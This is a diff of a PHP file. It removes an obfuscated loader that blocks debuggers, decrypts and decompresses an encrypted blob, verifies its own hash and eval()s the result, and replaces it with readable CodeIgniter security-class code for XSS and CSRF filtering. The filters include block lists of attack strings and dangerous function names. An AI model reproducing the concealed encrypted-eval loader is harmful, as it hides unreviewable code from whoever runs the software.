@@ -1,28 +1,1004 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_r6yrcv03=('bas'.'e64'.'_de'.'cod'.'e');
-$_per046oe=('gzu'.'nco'.'mpr'.'ess');
-$_lby13169=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_mawcej94='V888qYw9';
-$_a0k67px2='zugD0b4HkDk=';
-$_ej6vnb3t='O734i4ZA';
-$_xerjyd05='tZjkxXJP';
-$_qutxbl80='YWrxxun1';
-$_u4y927l7='sWTRPg==';
-$_bi7ba7tb='T+qIN1jb';
-$_z8lydq83='UfiNTriy';
-$_zljiktr3=$_r6yrcv03($_mawcej94.$_xerjyd05.$_qutxbl80.$_ej6vnb3t.$_a0k67px2);
-$_xdwvwzg8=$_r6yrcv03($_z8lydq83.$_bi7ba7tb.$_u4y927l7);
-$_yxhmv9ox=$_r6yrcv03('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');
-$_l76lpste=$_lby13169($_yxhmv9ox,'aes-256-cbc',$_zljiktr3,OPENSSL_RAW_DATA,$_xdwvwzg8);
-if($_l76lpste===false){exit;}
-$_mz31wkz4=$_per046oe($_l76lpste);
-if($_mz31wkz4===false){exit;}
-$_uavsban0='c473ef878ab0553c4421483ae83cb554cbf4f9927e46e1df37c3c72e66235ce1';
-$_yisrca0e=@file_get_contents(__FILE__);
-if($_yisrca0e!==false){
-$_bsic24k9=str_replace($_uavsban0,"0000000000000000000000000000000000000000000000000000000000000000",$_yisrca0e);
-$_qtftx1m5=hash("sha256",$_bsic24k9);
-if($_qtftx1m5!==$_uavsban0){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Security {
+
+
+
+
+
+public $filename_bad_chars = array(
+'../', '<!--', '-->', '<', '>',
+"'", '"', '&', '$', '#',
+'{', '}', '[', ']', '=',
+';', '?', '%20', '%22',
+'%3c', 
+'%253c', 
+'%3e', 
+'%0e', 
+'%28', 
+'%29', 
+'%2528', 
+'%26', 
+'%24', 
+'%3f', 
+'%3b', 
+'%3d' 
+);
+
+
+
+
+
+
+
+public $charset = 'UTF-8';
+
+
+
+
+
+
+
+protected $_xss_hash;
+
+
+
+
+
+
+
+protected $_csrf_hash;
+
+
+
+
+
+
+
+
+protected $_csrf_expire = 7200;
+
+
+
+
+
+
+
+protected $_csrf_token_name = 'ci_csrf_token';
+
+
+
+
+
+
+
+protected $_csrf_cookie_name = 'ci_csrf_token';
+
+
+
+
+
+protected $_never_allowed_str = array(
+'document.cookie' => '[removed]',
+'(document).cookie' => '[removed]',
+'document.write' => '[removed]',
+'(document).write' => '[removed]',
+'.parentNode' => '[removed]',
+'.innerHTML' => '[removed]',
+'-moz-binding' => '[removed]',
+'<!--' => '&lt;!--',
+'-->' => '--&gt;',
+'<![CDATA[' => '&lt;![CDATA[',
+'<comment>' => '&lt;comment&gt;',
+'<%' => '&lt;&#37;'
+);
+
+
+
+
+
+protected $_never_allowed_regex = array(
+'javascript\s*:',
+'(\(?document\)?|\(?window\)?(\.document)?)\.(location|on\w*)',
+'expression\s*(\(|&\#40;)', 
+'vbscript\s*:', 
+'wscript\s*:', 
+'jscript\s*:', 
+'vbs\s*:', 
+'Redirect\s+30\d',
+"([\"'])?data\s*:[^\\1]*?base64[^\\1]*?,[^\\1]*?\\1?"
+);
+
+
+
+
+
+public function __construct()
+{
+
+if (config_item('csrf_protection'))
+{
+
+foreach (array('csrf_expire', 'csrf_token_name', 'csrf_cookie_name') as $key)
+{
+if (NULL !== ($val = config_item($key)))
+{
+$this->{'_'.$key} = $val;
 }
-eval($_mz31wkz4);
+}
+
+if ($cookie_prefix = config_item('cookie_prefix'))
+{
+$this->_csrf_cookie_name = $cookie_prefix.$this->_csrf_cookie_name;
+}
+
+$this->_csrf_set_hash();
+}
+$this->charset = strtoupper(config_item('charset'));
+log_message('info', 'Security Class Initialized');
+}
+
+
+
+
+
+
+/**
+ * TRUE khi request không đến từ trang khác: Origin (hoặc Referer nếu thiếu Origin) có host[:port] trùng Host.
+ * Không có cả hai (curl, ứng dụng không phải trình duyệt) thì cho qua: các trình duyệt hiện nay luôn gửi
+ * Origin với POST khác nguồn, và token CSRF vẫn được kiểm ngay sau đó.
+ */
+protected function _same_origin_request()
+{
+$host = isset($_SERVER['HTTP_HOST']) ? strtolower((string) $_SERVER['HTTP_HOST']) : '';
+$source = isset($_SERVER['HTTP_ORIGIN']) ? (string) $_SERVER['HTTP_ORIGIN']
+: (isset($_SERVER['HTTP_REFERER']) ? (string) $_SERVER['HTTP_REFERER'] : NULL);
+if ($source === NULL || $source === '')
+{
+return TRUE;
+}
+$parts = parse_url($source);
+if ( ! is_array($parts) || empty($parts['host']) || $host === '')
+{
+return FALSE;
+}
+$src = strtolower($parts['host']).(isset($parts['port']) ? ':'.$parts['port'] : '');
+if ($src === $host)
+{
+return TRUE;
+}
+// Host có thể kèm cổng mặc định (example.com:443) trong khi Origin thì không, hoặc ngược lại.
+$strip = function ($h) { return preg_replace('/:(80|443)$/', '', $h); };
+return $strip($src) === $strip($host);
+}
+
+public function csrf_verify()
+{
+
+if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST')
+{
+return $this->csrf_set_cookie();
+}
+
+if ($exclude_uris = config_item('csrf_exclude_uris'))
+{
+$uri = load_class('URI', 'core');
+foreach ($exclude_uris as $excluded)
+{
+if (preg_match('#^'.$excluded.'$#i'.(UTF8_ENABLED ? 'u' : ''), $uri->uri_string()))
+{
+return $this;
+}
+}
+}
+
+// Cookie CSRF có thể bị trang khác cùng tên miền gốc (subdomain anh em) ghi đè, nên chỉ so cookie với form
+// là chưa đủ: request POST từ trình duyệt phải có Origin (hoặc Referer) trùng host của trang.
+if ( ! $this->_same_origin_request())
+{
+$this->csrf_show_error();
+}
+
+$valid = isset($_POST[$this->_csrf_token_name], $_COOKIE[$this->_csrf_cookie_name])
+&& is_string($_POST[$this->_csrf_token_name]) && is_string($_COOKIE[$this->_csrf_cookie_name])
+&& hash_equals($_POST[$this->_csrf_token_name], $_COOKIE[$this->_csrf_cookie_name]);
+
+unset($_POST[$this->_csrf_token_name]);
+
+if (config_item('csrf_regenerate'))
+{
+
+unset($_COOKIE[$this->_csrf_cookie_name]);
+$this->_csrf_hash = NULL;
+}
+$this->_csrf_set_hash();
+$this->csrf_set_cookie();
+if ($valid !== TRUE)
+{
+$this->csrf_show_error();
+}
+log_message('info', 'CSRF token verified');
+return $this;
+}
+
+
+
+
+
+
+
+public function csrf_set_cookie()
+{
+$expire = time() + $this->_csrf_expire;
+$secure_cookie = (bool) config_item('cookie_secure');
+if ($secure_cookie && ! is_https())
+{
+return FALSE;
+}
+setcookie(
+$this->_csrf_cookie_name,
+$this->_csrf_hash,
+array(
+'expires' => $expire,
+'path' => config_item('cookie_path'),
+'domain' => config_item('cookie_domain'),
+'secure' => $secure_cookie,
+'httponly' => config_item('cookie_httponly'),
+'samesite' => 'Lax',
+)
+);
+log_message('info', 'CSRF cookie sent');
+return $this;
+}
+
+
+
+
+
+
+public function csrf_show_error()
+{
+show_error('The action you have requested is not allowed.', 403);
+}
+
+
+
+
+
+
+
+public function get_csrf_hash()
+{
+return $this->_csrf_hash;
+}
+
+
+
+
+
+
+
+public function get_csrf_token_name()
+{
+return $this->_csrf_token_name;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function xss_clean($str, $is_image = FALSE)
+{
+
+if (is_array($str))
+{
+foreach ($str as $key => &$value)
+{
+$str[$key] = $this->xss_clean($value);
+}
+return $str;
+}
+
+$str = remove_invisible_characters($str);
+
+
+
+
+
+
+
+
+
+if (stripos($str, '%') !== false)
+{
+do
+{
+$oldstr = $str;
+$str = rawurldecode($str);
+$str = preg_replace_callback('#%(?:\s*[0-9a-f]){2,}#i', array($this, '_urldecodespaces'), $str);
+}
+while ($oldstr !== $str);
+unset($oldstr);
+}
+
+
+
+
+
+
+
+$str = preg_replace_callback("/[^a-z0-9>]+[a-z0-9]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
+$str = preg_replace_callback('/<\w+.*/si', array($this, '_decode_entity'), $str);
+
+$str = remove_invisible_characters($str);
+
+
+
+
+
+
+
+
+$str = str_replace("\t", ' ', $str);
+
+$converted_string = $str;
+
+$str = $this->_do_never_allowed($str);
+
+
+
+
+
+
+
+
+
+if ($is_image === TRUE)
+{
+
+
+
+$str = preg_replace('/<\?(php)/i', '&lt;?\\1', $str);
+}
+else
+{
+$str = str_replace(array('<?', '?'.'>'), array('&lt;?', '?&gt;'), $str);
+}
+
+
+
+
+
+
+$words = array(
+'javascript', 'expression', 'vbscript', 'jscript', 'wscript',
+'vbs', 'script', 'base64', 'applet', 'alert', 'document',
+'write', 'cookie', 'window', 'confirm', 'prompt', 'eval'
+);
+foreach ($words as $word)
+{
+$word = implode('\s*', str_split($word)).'\s*';
+
+
+$str = preg_replace_callback('#('.substr($word, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+do
+{
+$original = $str;
+if (preg_match('/<a/i', $str))
+{
+$str = preg_replace_callback('#<a(?:rea)?[^a-z0-9>]+([^>]*?)(?:>|$)#si', array($this, '_js_link_removal'), $str);
+}
+if (preg_match('/<img/i', $str))
+{
+$str = preg_replace_callback('#<img[^a-z0-9]+([^>]*?)(?:\s?/?>|$)#si', array($this, '_js_img_removal'), $str);
+}
+if (preg_match('/script|xss/i', $str))
+{
+$str = preg_replace('#</*(?:script|xss).*?>#si', '[removed]', $str);
+}
+}
+while ($original !== $str);
+unset($original);
+
+
+
+
+
+
+
+
+
+$pattern = '#'
+.'<((?<slash>/*\s*)((?<tagName>[a-z0-9]+)(?=[^a-z0-9]|$)|.+)' 
+.'[^\s\042\047a-z0-9>/=]*' 
+
+.'(?<attributes>(?:[\s\042\047/=]*' 
+.'[^\s\042\047>/=]+' 
+
+.'(?:\s*=' 
+.'(?:[^\s\042\047=><`]+|\s*\042[^\042]*\042|\s*\047[^\047]*\047|\s*(?U:[^\s\042\047=><`]*))' 
+.')?' 
+.')*)' 
+.'[^>]*)(?<closeTag>\>)?#isS';
+
+
+
+do
+{
+$old_str = $str;
+$str = preg_replace_callback($pattern, array($this, '_sanitize_naughty_html'), $str);
+}
+while ($old_str !== $str);
+unset($old_str);
+
+
+
+
+
+
+
+
+
+
+
+
+$str = preg_replace(
+'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si',
+'\\1\\2&#40;\\3&#41;',
+$str
+);
+
+
+$str = preg_replace(
+'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)`(.*?)`#si',
+'\\1\\2&#96;\\3&#96;',
+$str
+);
+
+
+
+$str = $this->_do_never_allowed($str);
+
+
+
+
+
+
+
+
+
+if ($is_image === TRUE)
+{
+return ($str === $converted_string);
+}
+return $str;
+}
+
+
+
+
+
+
+
+
+
+public function xss_hash()
+{
+if ($this->_xss_hash === NULL)
+{
+$rand = $this->get_random_bytes(16);
+$this->_xss_hash = ($rand === FALSE)
+? md5(uniqid(mt_rand(), TRUE))
+: bin2hex($rand);
+}
+return $this->_xss_hash;
+}
+
+
+
+
+
+
+
+public function get_random_bytes($length)
+{
+if (empty($length) OR ! ctype_digit((string) $length))
+{
+return FALSE;
+}
+if (function_exists('random_bytes'))
+{
+try
+{
+
+return random_bytes((int) $length);
+}
+catch (Exception $e)
+{
+
+
+log_message('error', $e->getMessage());
+return FALSE;
+}
+}
+
+if (defined('MCRYPT_DEV_URANDOM') && ($output = mcrypt_create_iv($length, MCRYPT_DEV_URANDOM)) !== FALSE)
+{
+return $output;
+}
+if (is_readable('/dev/urandom') && ($fp = fopen('/dev/urandom', 'rb')) !== FALSE)
+{
+
+is_php('5.4') && stream_set_chunk_size($fp, $length);
+$output = fread($fp, $length);
+fclose($fp);
+if ($output !== FALSE)
+{
+return $output;
+}
+}
+if (function_exists('openssl_random_pseudo_bytes'))
+{
+return openssl_random_pseudo_bytes($length);
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function entity_decode($str, $charset = NULL)
+{
+if (strpos($str, '&') === FALSE)
+{
+return $str;
+}
+static $_entities;
+isset($charset) OR $charset = $this->charset;
+$flag = is_php('5.4')
+? ENT_COMPAT | ENT_HTML5
+: ENT_COMPAT;
+if ( ! isset($_entities))
+{
+$_entities = array_map('strtolower', get_html_translation_table(HTML_ENTITIES, $flag, $charset));
+
+
+if ($flag === ENT_COMPAT)
+{
+$_entities[':'] = '&colon;';
+$_entities['('] = '&lpar;';
+$_entities[')'] = '&rpar;';
+$_entities["\n"] = '&NewLine;';
+$_entities["\t"] = '&Tab;';
+}
+}
+do
+{
+$str_compare = $str;
+
+if (preg_match_all('/&[a-z]{2,}(?![a-z;])/i', $str, $matches))
+{
+$replace = array();
+$matches = array_unique(array_map('strtolower', $matches[0]));
+foreach ($matches as &$match)
+{
+if (($char = array_search($match.';', $_entities, TRUE)) !== FALSE)
+{
+$replace[$match] = $char;
+}
+}
+$str = str_replace(array_keys($replace), array_values($replace), $str);
+}
+
+$str = html_entity_decode(
+preg_replace('/(&#(?:x0*[0-9a-f]{2,5}(?![0-9a-f;])|(?:0*\d{2,4}(?![0-9;]))))/iS', '$1;', $str),
+$flag,
+$charset
+);
+if ($flag === ENT_COMPAT)
+{
+$str = str_replace(array_values($_entities), array_keys($_entities), $str);
+}
+}
+while ($str_compare !== $str);
+return $str;
+}
+
+
+
+
+
+
+
+
+public function sanitize_filename($str, $relative_path = FALSE)
+{
+$bad = $this->filename_bad_chars;
+if ( ! $relative_path)
+{
+$bad[] = './';
+$bad[] = '/';
+}
+$str = remove_invisible_characters($str, FALSE);
+do
+{
+$old = $str;
+$str = str_replace($bad, '', $str);
+}
+while ($old !== $str);
+return stripslashes($str);
+}
+
+
+
+
+
+
+
+public function strip_image_tags($str)
+{
+return preg_replace(
+array(
+'#<img[\s/]+.*?src\s*=\s*(["\'])([^\\1]+?)\\1.*?\>#i',
+'#<img[\s/]+.*?src\s*=\s*?(([^\s"\'=<>`]+)).*?\>#i'
+),
+'\\2',
+$str
+);
+}
+
+
+
+
+
+
+
+
+protected function _urldecodespaces($matches)
+{
+$input = $matches[0];
+$nospaces = preg_replace('#\s+#', '', $input);
+return ($nospaces === $input)
+? $input
+: rawurldecode($nospaces);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _compact_exploded_words($matches)
+{
+return preg_replace('/\s+/s', '', $matches[1]).$matches[2];
+}
+
+
+
+
+
+
+
+
+
+
+protected function _sanitize_naughty_html($matches)
+{
+static $naughty_tags = array(
+'alert', 'area', 'prompt', 'confirm', 'applet', 'audio', 'basefont', 'base', 'behavior', 'bgsound',
+'blink', 'body', 'embed', 'expression', 'form', 'frameset', 'frame', 'head', 'html', 'ilayer',
+'iframe', 'input', 'button', 'select', 'isindex', 'layer', 'link', 'meta', 'keygen', 'object',
+'plaintext', 'style', 'script', 'textarea', 'title', 'math', 'video', 'svg', 'xml', 'xss'
+);
+static $evil_attributes = array(
+'on\w+', 'style', 'xmlns', 'formaction', 'form', 'xlink:href', 'FSCommand', 'seekSegmentTime'
+);
+
+if (empty($matches['closeTag']))
+{
+return '&lt;'.$matches[1];
+}
+
+elseif (in_array(strtolower($matches['tagName']), $naughty_tags, TRUE))
+{
+return '&lt;'.$matches[1].'&gt;';
+}
+
+elseif (isset($matches['attributes']))
+{
+
+$attributes = array();
+
+$attributes_pattern = '#'
+.'(?<name>[^\s\042\047>/=]+)' 
+
+.'(?:\s*=(?<value>[^\s\042\047=><`]+|\s*\042[^\042]*\042|\s*\047[^\047]*\047|\s*(?U:[^\s\042\047=><`]*)))' 
+.'#i';
+
+$is_evil_pattern = '#^('.implode('|', $evil_attributes).')$#i';
+
+do
+{
+
+
+
+$matches['attributes'] = preg_replace('#^[^a-z]+#i', '', $matches['attributes']);
+if ( ! preg_match($attributes_pattern, $matches['attributes'], $attribute, PREG_OFFSET_CAPTURE))
+{
+
+break;
+}
+if (
+
+preg_match($is_evil_pattern, $attribute['name'][0])
+
+OR (trim($attribute['value'][0]) === '')
+)
+{
+$attributes[] = 'xss=removed';
+}
+else
+{
+$attributes[] = $attribute[0][0];
+}
+$matches['attributes'] = substr($matches['attributes'], $attribute[0][1] + strlen($attribute[0][0]));
+}
+while ($matches['attributes'] !== '');
+$attributes = empty($attributes)
+? ''
+: ' '.implode(' ', $attributes);
+return '<'.$matches['slash'].$matches['tagName'].$attributes.'>';
+}
+return $matches[0];
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _js_link_removal($match)
+{
+return str_replace(
+$match[1],
+preg_replace(
+'#href=.*?(?:(?:alert|prompt|confirm)(?:\(|&\#40;|`|&\#96;)|javascript:|livescript:|mocha:|charset=|window\.|\(?document\)?\.|\.cookie|<script|<xss|d\s*a\s*t\s*a\s*:)#si',
+'',
+$this->_filter_attributes($match[1])
+),
+$match[0]
+);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _js_img_removal($match)
+{
+return str_replace(
+$match[1],
+preg_replace(
+'#src=.*?(?:(?:alert|prompt|confirm|eval)(?:\(|&\#40;|`|&\#96;)|javascript:|livescript:|mocha:|charset=|window\.|\(?document\)?\.|\.cookie|<script|<xss|base64\s*,)#si',
+'',
+$this->_filter_attributes($match[1])
+),
+$match[0]
+);
+}
+
+
+
+
+
+
+
+
+protected function _convert_attribute($match)
+{
+return str_replace(array('>', '<', '\\'), array('&gt;', '&lt;', '\\\\'), $match[0]);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _filter_attributes($str)
+{
+$out = '';
+if (preg_match_all('#\s*[a-z\-]+\s*=\s*(\042|\047)([^\\1]*?)\\1#is', $str, $matches))
+{
+foreach ($matches[0] as $match)
+{
+$out .= preg_replace('#/\*.*?\*/#s', '', $match);
+}
+}
+return $out;
+}
+
+
+
+
+
+
+
+
+protected function _decode_entity($match)
+{
+
+
+$match = preg_replace('|\&([a-z\_0-9\-]+)\=([a-z\_0-9\-/]+)|i', $this->xss_hash().'\\1=\\2', $match[0]);
+
+return str_replace(
+$this->xss_hash(),
+'&',
+$this->entity_decode($match, $this->charset)
+);
+}
+
+
+
+
+
+
+
+
+protected function _do_never_allowed($str)
+{
+$str = str_replace(array_keys($this->_never_allowed_str), $this->_never_allowed_str, $str);
+foreach ($this->_never_allowed_regex as $regex)
+{
+$str = preg_replace('#'.$regex.'#is', '[removed]', $str);
+}
+return $str;
+}
+
+
+
+
+
+
+protected function _csrf_set_hash()
+{
+if ($this->_csrf_hash === NULL)
+{
+
+
+
+
